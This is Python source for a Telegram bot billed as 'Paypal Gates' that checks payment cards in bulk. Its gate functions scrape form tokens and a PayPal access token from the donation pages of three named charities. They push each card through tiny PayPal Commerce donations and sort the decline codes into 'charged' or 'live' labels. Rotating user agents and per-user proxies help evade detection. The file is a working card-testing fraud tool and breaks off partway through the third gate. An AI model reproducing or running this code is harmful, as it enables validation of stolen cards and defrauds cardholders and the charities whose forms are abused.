import os
import telebot
import time
import threading
from telebot import types
import requests
import re
import base64
from requests_toolbelt import MultipartEncoder
from user_agent import generate_user_agent
from datetime import datetime
import socks
import socket

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

token = os.environ.get("BOT_TOKEN", "").strip()
if not token:
    raise SystemExit("اضبط BOT_TOKEN في متغير البيئة أو في ملف .env")

bot = telebot.TeleBot(token, parse_mode="HTML")

admin = 2031443714
myid = ['2031443714']
stop = {}
user_gateways = {}
stop_flags = {}
stopuser = {}
command_usage = {}
proxies_list = {}
proxy_enabled = {}

mes = types.InlineKeyboardMarkup(row_width=1)
mes.add(types.InlineKeyboardButton("▶️ Start", callback_data="start"))

back_kb = types.InlineKeyboardMarkup(row_width=1)
back_kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))

@bot.message_handler(commands=["start"])
def handle_start(message):
    name = message.from_user.first_name
    sent_message = bot.send_message(chat_id=message.chat.id, text="👹 Starting...")
    time.sleep(1)
    bot.edit_message_text(chat_id=message.chat.id, message_id=sent_message.message_id, text=f"Hi {name}, Welcome To bot (Paypal Gates)", reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    bot.answer_callback_query(call.id)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="""- Welcome to checking bot
Charged ✅

• Manual check: /v , /pp , /cc
• Combo: Just send the file
• Add proxy: /addproxy
""", reply_markup=back_kb)

@bot.callback_query_handler(func=lambda call: call.data == 'back')
def handle_back(call):
    name = call.from_user.first_name
    bot.answer_callback_query(call.id)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Hi {name}, Welcome To bot (Paypal Gates)", reply_markup=mes)

def check_proxy(proxy):
    try:
        proxy_type = 'http'
        proxy_str = proxy
        
        if proxy.startswith('socks5://'):
            proxy_type = 'socks5'
            proxy_str = proxy.replace('socks5://', '')
        elif proxy.startswith('http://'):
            proxy_str = proxy.replace('http://', '')
        elif proxy.startswith('https://'):
            proxy_str = proxy.replace('https://', '')
        
        proxies = {
            'http': f'{proxy_type}://{proxy_str}',
            'https': f'{proxy_type}://{proxy_str}'
        }
        
        test_url = 'http://httpbin.org/ip'
        response = requests.get(test_url, proxies=proxies, timeout=10)
        
        if response.status_code == 200:
            ip_data = response.json()
            return True, f"Working - IP: {ip_data.get('origin', 'Unknown')}"
        else:
            return False, "Not responding"
            
    except requests.exceptions.ConnectTimeout:
        return False, "Connection timeout"
    except requests.exceptions.ProxyError:
        return False, "Proxy error"
    except Exception as e:
        return False, f"Error: {str(e)[:30]}"

@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    user_id = str(message.from_user.id)
    
    msg = bot.send_message(message.chat.id, "Send proxy in format:\nIP:PORT or username:password@IP:PORT\nExample: 192.168.1.1:8080 or user:pass@192.168.1.1:8080")
    bot.register_next_step_handler(msg, process_proxy)

def process_proxy(message):
    user_id = str(message.from_user.id)
    proxy_text = message.text.strip()
    
    status_msg = bot.send_message(message.chat.id, "🔍 Checking proxy...")
    
    working, result = check_proxy(proxy_text)
    
    if working:
        proxies_list[user_id] = proxy_text
        proxy_enabled[user_id] = True
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        enable_btn = types.InlineKeyboardButton("✅ Enable", callback_data="proxy_enable")
        disable_btn = types.InlineKeyboardButton("❌ Disable", callback_data="proxy_disable")
        markup.add(enable_btn, disable_btn)
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"✅ Proxy working!\n{result}\n\nProxy saved. Use buttons to control:",
            reply_markup=markup
        )
    else:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"❌ Proxy not working!\nReason: {result}"
        )

@bot.callback_query_handler(func=lambda call: call.data in ['proxy_enable', 'proxy_disable'])
def proxy_control(call):
    user_id = str(call.from_user.id)
    
    if call.data == 'proxy_enable':
        proxy_enabled[user_id] = True
        bot.answer_callback_query(call.id, "✅ Proxy enabled")
    else:
        proxy_enabled[user_id] = False
        bot.answer_callback_query(call.id, "❌ Proxy disabled")
    
    status = "enabled" if proxy_enabled[user_id] else "disabled"
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"Proxy {status} for your account."
    )

def get_session_with_proxy(user_id):
    session = requests.Session()
    
    if user_id in proxy_enabled and proxy_enabled[user_id] and user_id in proxies_list:
        proxy = proxies_list[user_id]
        proxy_type = 'http'
        proxy_str = proxy
        
        if proxy.startswith('socks5://'):
            proxy_type = 'socks5'
            proxy_str = proxy.replace('socks5://', '')
        elif proxy.startswith('http://'):
            proxy_str = proxy.replace('http://', '')
        elif proxy.startswith('https://'):
            proxy_str = proxy.replace('https://', '')
        
        proxies = {
            'http': f'{proxy_type}://{proxy_str}',
            'https': f'{proxy_type}://{proxy_str}'
        }
        session.proxies.update(proxies)
    
    return session

# ===================== GATE 1: mountaintopdiscovery.org 0.50$ (/v) =====================
def check_gate_050(ccx, user_id):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        r = get_session_with_proxy(user_id)
        user = generate_user_agent()
        
        headers = {'user-agent': user}
        response = r.get('https://mountaintopdiscovery.org/donations/support', cookies=r.cookies, headers=headers, timeout=10)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        domain = 'mountaintopdiscovery.org'
        
        headers = {
            'origin': f'https://{domain}',
            'referer': 'https://mountaintopdiscovery.org/donations/support',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://mountaintopdiscovery.org/donations/support',
            'give-form-url': 'https://mountaintopdiscovery.org/donations/support',
            'give-form-minimum': '0.50',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.50',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'bot',
            'give_last': 'rights and',
            'give_email': 'bot22@gmail.com',
            'card_name': 'bot',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post(f'https://{domain}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://mountaintopdiscovery.org/donations/support'),
            'give-form-url': (None, 'https://mountaintopdiscovery.org/donations/support'),
            'give-form-minimum': (None, '0.50'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.50'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'bot'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'bot22@gmail.com'),
            'card_name': (None, 'bot'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': f'https://{domain}',
            'referer': 'https://mountaintopdiscovery.org/donations/support',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = r.post(f'https://{domain}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data, timeout=10)
        tok = (response.json()['data']['id'])
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://mountaintopdiscovery.org/donations/support'),
            'give-form-url': (None, 'https://mountaintopdiscovery.org/donations/support'),
            'give-form-minimum': (None, '0.50'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.50'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'bot'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'bot22@gmail.com'),
            'card_name': (None, 'bot'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': f'https://{domain}',
            'referer': 'https://mountaintopdiscovery.org/donations/support',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        response = r.post(f'https://{domain}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data, timeout=10)
        text = response.text
        
        if 'true' in text or 'sucsess' in text or 'COMPLETED' in text:    
            return "CHARGE 🔥"
        elif 'INSUFFICIENT_FUNDS' in text:
            return 'INSUFFICIENT FUNDS ✅'
        elif 'DO_NOT_HONOR' in text:
            return "DO NOT HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "ACCOUNT CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST OR STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2 FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return 'INVALID ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT NOT PERMITTED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text:
            return "ACCOUNT BLOCKED BY ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return 'ORDER NOT APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return 'PICKUP CARD SPECIAL CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER CANNOT PAY"
        elif 'GENERIC_DECLINE' in text:
            return 'GENERIC DECLINE'
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE VIOLATION"
        elif 'TRANSACTION NOT PERMITTED' in text:
            return "TRANSACTION NOT PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return 'PAYMENT DENIED'
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED OR INACTIVE ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return 'SECURITY VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED DUE TO UPDATED ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION CANNOT BE COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED PLEASE RETRY"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "EXCEED LIMIT"
        else:
            try:
                result = response.json()['data']['error']
                return f"{result}"
            except:
                return "UNKNOWN ERROR"
                
    except Exception as e:
        return f"ERROR"

# ===================== GATE 2: yahyapeacefoundation.org 0.10$ (/pp) =====================
def check_gate_010(ccx, user_id):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        r = get_session_with_proxy(user_id)
        user = generate_user_agent()
        
        headers = {'user-agent': user}
        response = r.get('https://yahyapeacefoundation.org/donate-now4/', cookies=r.cookies, headers=headers, timeout=10)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        domain = 'yahyapeacefoundation.org'
        
        headers = {
            'origin': f'https://{domain}',
            'referer': 'https://yahyapeacefoundation.org/donate-now4/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://yahyapeacefoundation.org/donate-now4/',
            'give-form-url': 'https://yahyapeacefoundation.org/donate-now4/',
            'give-form-minimum': '0.10',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.10',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'bot',
            'give_last': 'rights and',
            'give_email': 'bot22@gmail.com',
            'card_name': 'bot',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post(f'https://{domain}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://yahyapeacefoundation.org/donate-now4/'),
            'give-form-url': (None, 'https://yahyapeacefoundation.org/donate-now4/'),
            'give-form-minimum': (None, '0.10'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.10'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'bot'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'bot22@gmail.com'),
            'card_name': (None, 'bot'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': f'https://{domain}',
            'referer': 'https://yahyapeacefoundation.org/donate-now4/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = r.post(f'https://{domain}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data, timeout=10)
        tok = (response.json()['data']['id'])
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://yahyapeacefoundation.org/donate-now4/'),
            'give-form-url': (None, 'https://yahyapeacefoundation.org/donate-now4/'),
            'give-form-minimum': (None, '0.10'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.10'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'bot'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'bot22@gmail.com'),
            'card_name': (None, 'bot'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': f'https://{domain}',
            'referer': 'https://yahyapeacefoundation.org/donate-now4/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        response = r.post(f'https://{domain}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data, timeout=10)
        text = response.text
        
        if 'true' in text or 'sucsess' in text or 'COMPLETED' in text:    
            return "CHARGE 🔥"
        elif 'INSUFFICIENT_FUNDS' in text:
            return 'INSUFFICIENT FUNDS ✅'
        elif 'DO_NOT_HONOR' in text:
            return "DO NOT HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "ACCOUNT CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST OR STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2 FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return 'INVALID ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT NOT PERMITTED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text:
            return "ACCOUNT BLOCKED BY ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return 'ORDER NOT APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return 'PICKUP CARD SPECIAL CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER CANNOT PAY"
        elif 'GENERIC_DECLINE' in text:
            return 'GENERIC DECLINE'
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE VIOLATION"
        elif 'TRANSACTION NOT PERMITTED' in text:
            return "TRANSACTION NOT PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return 'PAYMENT DENIED'
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED OR INACTIVE ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return 'SECURITY VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED DUE TO UPDATED ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION CANNOT BE COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED PLEASE RETRY"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "EXCEED LIMIT"
        else:
            try:
                result = response.json()['data']['error']
                return f"{result}"
            except:
                return "UNKNOWN ERROR"
                
    except Exception as e:
        return f"ERROR"

# ===================== GATE 3: publicbankinginstitute.org 0.01$ (/cc) =====================
def check_gate_001(ccx, user_id):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        r = get_session_with_proxy(user_id)
        user = generate_user_agent()
        
        headers = {'user-agent': user}
        response = r.get('https://publicbankinginstitute.org/donations/donor', cookies=r.cookies, headers=headers, timeout=10)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        domain = 'publicbankinginstitute.org'
        
        headers = {
            'origin': f'https://{domain}',
            'referer': 'https://publicbankinginstitute.org/donations/donor',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://publicbankinginstitute.org/donations/donor',
            'give-form-url': 'https://publicbankinginstitute.org/donations/donor',
            'give-form-minimum': '0.01',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.01',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'bot',
            'give_last': 'rights and',
            'give_email': 'bot22@gmail.com',
            'card_name': 'bot',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post(f'https://{domain}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://publicbankinginstitute.org/donations/donor'),
            'give-form-url': (None, 'https://publicbankinginstitute.org/donations/donor'),
            'give-form-minimum': (None, '0.01'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.01'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'bot'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'bot22@gmail.com'),
            'card_name': (None, 'bot'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': f'https://{domain}',
            'referer': 'https://publicbankinginstitute.org/donations/donor',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = r.post(f'https://{domain}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data, timeout=10)
        tok = (response.json()['data']['id'])
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
